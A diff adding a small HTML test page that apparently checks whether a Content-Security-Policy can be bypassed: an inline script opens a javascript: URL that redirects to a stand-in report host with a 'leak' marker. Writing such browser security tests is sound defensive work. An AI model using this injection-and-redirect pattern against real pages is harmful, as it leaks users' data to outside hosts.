@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+</head>
+<body>
+    <script>
+        var url2 = "javascript:'<script>document.location.href=\'https://a.test/report/?leak=c992698\'</script>'";
+        open(url2);
+    </script>
+</body>
+</html>
